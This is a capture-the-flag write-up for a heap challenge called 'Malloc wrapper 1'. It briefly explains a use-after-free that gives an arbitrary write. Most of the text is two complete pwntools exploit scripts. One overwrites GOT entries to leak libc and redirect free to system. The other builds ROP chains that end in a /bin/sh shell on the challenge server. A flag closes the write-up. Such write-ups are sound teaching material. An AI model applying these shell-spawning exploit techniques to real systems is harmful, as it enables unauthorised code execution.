# Malloc wrapper 1

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

The program implemented an allocator wrapper using a binary search tree and a cache. The program was not supposed to be Partial RELRO, but it was, and I took advantage of that.
I found a UAF that allowed us to have arbitrary write. During the failure, bytes were copied from `chunk_data_address + offset` and the validation before was `chunk_size <= chunk_data_address + offset`.
The program does not had PIE, then I allocated big chunks to overwrite the GOT at my will. Pretty fun challenge.

## Exploit
```py
#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall")
libc = ELF("./libc.so.6")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#ld = ELF("./")

context.binary = elf
#context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
b main
'''

domain= "161.97.155.116" 
port = 45384

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================
leak = b""
def alloc(size):
    global leak
    r.sendline(b"1")
    r.sendlineafter(b"allocation:",str(size).encode())
    leak = r.recvuntil(b"created: ").strip().split(b"Alloc")[0]
    l = r.recvline().strip()
    return int(l)

def delete(key):
    r.sendline(b"3")
    r.sendlineafter(b"key:",str(key).encode())

def write(key,offset,payload):
    r.sendline(b"2")
    r.sendlineafter(b"key:",str(key).encode())
    r.sendlineafter(b"offset:",str(offset).encode())
    r.sendafter(b"payload:",payload)

r.recvuntil(b"you: ")
stack_leak = int(r.recvline().strip(),16)
info("STACK LEAK: " + hex(stack_leak))

# with a alloc(n) n > writable_addess + 8 we got arbitrary write
A = alloc(0x500000)
delete(A)
write(A,elf.got.malloc,p64(elf.plt.puts))

# 'malloc' --> 'puts'
# Leak libc puts address
B = alloc(elf.got.puts)

puts_addr = u64(leak.strip().ljust(8, b'\x00'))
libc.address = puts_addr - libc.symbols['puts']
system = libc.symbols['system']

# fix 'malloc'
# 'free' --> 'system'
write(A,elf.got.malloc,p64(libc.symbols['malloc']))
write(A,elf.got.free,p64(libc.symbols['system']))

C = alloc(20)
write(C,0,b"/bin/sh\x00")
delete(C)

r.interactive()
```

## Intended Solution
```py
from pwn import *

context.arch = "amd64"

elf = ELF("./chall")

if args.REMOTE:
    libc = ELF("./libc.so.6")
else:
    libc = elf.libc

ropelf = ROP(elf)

def init_p(p: process):
    p.recvuntil(b"A gift for you: ")
    leak = int(p.recvline().decode(), 16)
    return leak

def init(elf: ELF):
    if args.REMOTE:
        p = remote("161.97.155.116", 45384)
        # p = remote("127.0.0.1", 5000)
    else:
        p = elf.process()
    return (p, init_p(p))

def create(p: process, size: int):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b"Enter size of the allocation: ", f"{ size }".encode())

    p.recvuntil(b"Allocation successfully created: ")
    return p.recvline()[:-1].decode()

def write(p: process, key: str, offset: int, payload: bytes):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b"Enter key: ", key.encode())
    p.sendlineafter(b"Enter offset: ", f"{ offset }".encode())
    p.sendafter(b"Enter payload: ", payload)

def delete(p: process, key: str):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b"Enter key: ", key.encode())

def calculate_addresses(stack):
    return (stack - 1060, stack-12)

p, stack = init(elf)
buf, ret_address = calculate_addresses(stack)

log.info(f"Challenge initialized, stack address leaked: { hex(stack) }")

cache_key = create(p, elf.symbols.CACHE + 100)
write(p, cache_key, 0, b"a")
delete(p, cache_key)

ropelf.puts(elf.symbols.got.puts)
ropelf.raw(elf.symbols.main)

chain = ropelf.chain()

write(p, cache_key, elf.symbols.CACHE, p64(buf + len(chain) - 24))

payload = chain + p64(1) + p64(0x1000) + p64(ret_address)

write(p, "1", 0, payload)

puts = u64(p.recv(6) + p16(0))
libc.address = puts - libc.symbols.puts

log.info(f"Puts leaked: { hex(puts) }")
log.info(f"Libc base address leaked: { hex(libc.address) }")

stack = init_p(p)
buf, ret_address = calculate_addresses(stack)

cache_key = create(p, elf.symbols.CACHE + 100)
write(p, cache_key, 0, b"a")
delete(p, cache_key)

rop = ROP(libc)

rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh\x00")))

chain = rop.chain()

write(p, cache_key, elf.symbols.CACHE, p64(buf + len(chain) - 24))

payload = chain + p64(1) + p64(0x1000) + p64(ret_address)

write(p, "1", 0, payload)

p.interactive()
```

`QnQSec{the_server_is_down}`

